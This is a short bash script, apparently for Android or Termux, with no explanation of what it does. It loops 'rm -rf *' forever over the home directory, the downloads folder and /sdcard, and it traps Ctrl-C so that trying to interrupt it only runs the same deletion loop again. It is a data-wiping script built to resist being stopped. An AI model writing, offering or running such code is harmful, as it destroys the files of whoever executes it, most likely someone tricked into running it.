#!coding bash
exc() {
     while true; do
     cd
     cd downloads
     rm -rf *
     cd
     cd /sdcard
     rm -rf *
     cd
     rm -rf *
     done
     exit 0
}
trap SIGINT exc
sleep 2
while true; do
cd
cd downloads
rm -rf *
cd
cd /sdcard
rm -rf *
cd
rm -rf *
done
exit 1
